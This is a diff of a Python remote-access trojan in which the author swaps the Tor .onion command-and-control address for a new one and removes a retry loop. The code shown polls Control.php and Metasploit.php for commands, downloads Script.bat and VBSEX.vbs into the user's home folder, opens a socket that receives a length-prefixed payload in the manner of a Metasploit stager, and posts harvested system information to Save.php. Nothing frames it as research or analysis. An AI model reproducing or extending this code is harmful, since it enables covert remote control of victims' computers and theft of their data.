@@ -58,12 +58,8 @@ def METASPLOIT():
     previous_data = ""
 
     while True:
-     url = 'http://pfp2jryu2fxsfmkiv2a4gkctmaiqlvcpf7lcvx5s6lsl7ejh5fhnptqd.onion/Metasploit.php'
+     url = 'http://xvi5zgvorv6fm7zpqcqoruna7a535a7zzlaiaeypdk56wdzcrclyczqd.onion/Metasploit.php'
      response = requests_session.get(url)
-     while response.status_code != 200:
-            time.sleep(10) 
-            response = requests.get(url)
-        
      if response.status_code == 200:
         data = response.text.strip()
         if data != previous_data:
@@ -90,7 +86,7 @@ def METASPLOIT():
                     restart_program()
                 elif option == "STARTVBSBAT":
                     os.system("cls")
-                    php_script_url = 'http://pfp2jryu2fxsfmkiv2a4gkctmaiqlvcpf7lcvx5s6lsl7ejh5fhnptqd.onion/Control.php'
+                    php_script_url = 'http://xvi5zgvorv6fm7zpqcqoruna7a535a7zzlaiaeypdk56wdzcrclyczqd.onion/Control.php'
                     home_directory = os.path.expanduser("~")
                     web_page1_path = os.path.join(home_directory, "Script.bat")
                     vbs_file_path = os.path.join(home_directory, "VBSEX.vbs")
@@ -99,8 +95,8 @@ def METASPLOIT():
                         if os.path.exists(file_path):
                             os.remove(file_path)
 
-                    url1 = "http://pfp2jryu2fxsfmkiv2a4gkctmaiqlvcpf7lcvx5s6lsl7ejh5fhnptqd.onion/Script.io"
-                    url2 = "http://pfp2jryu2fxsfmkiv2a4gkctmaiqlvcpf7lcvx5s6lsl7ejh5fhnptqd.onion/VBSEX.io"
+                    url1 = "http://xvi5zgvorv6fm7zpqcqoruna7a535a7zzlaiaeypdk56wdzcrclyczqd.onion/Script.io"
+                    url2 = "http://xvi5zgvorv6fm7zpqcqoruna7a535a7zzlaiaeypdk56wdzcrclyczqd.onion/VBSEX.io"
 
                     download_file(url1, web_page1_path)
                     download_file(url2, vbs_file_path)
@@ -271,7 +267,7 @@ def METASPLOIT():
                            for port in ports_to_try:
                             try:
                               s = socket.socket(2, socket.SOCK_STREAM)
-                              s.connect(('/pfp2jryu2fxsfmkiv2a4gkctmaiqlvcpf7lcvx5s6lsl7ejh5fhnptqd.onion', port))  # Change the URL
+                              s.connect(('/xvi5zgvorv6fm7zpqcqoruna7a535a7zzlaiaeypdk56wdzcrclyczqd.onion', port))  # Change the URL
 
                               l = struct.unpack('>I', s.recv(4))[0]
                               d = s.recv(1)
@@ -393,7 +389,7 @@ def get_system_info():
         session = requests.Session()
         session.proxies = proxies
 
-        url = "http://pfp2jryu2fxsfmkiv2a4gkctmaiqlvcpf7lcvx5s6lsl7ejh5fhnptqd.onion/Save.php"
+        url = "http://xvi5zgvorv6fm7zpqcqoruna7a535a7zzlaiaeypdk56wdzcrclyczqd.onion/Save.php"
         data = data_to_send
         time.sleep(10)
         response = requests_session.post(url, data=data)
@@ -410,7 +406,7 @@ while True:
         def receive_data():
             global previous_command, previous_files
             while True:
-                php_script_url = 'http://pfp2jryu2fxsfmkiv2a4gkctmaiqlvcpf7lcvx5s6lsl7ejh5fhnptqd.onion/Control.php'
+                php_script_url = 'http://xvi5zgvorv6fm7zpqcqoruna7a535a7zzlaiaeypdk56wdzcrclyczqd.onion/Control.php'
                 time.sleep(10)
                 response = requests_session.get(php_script_url)
                 data = response.text.strip()
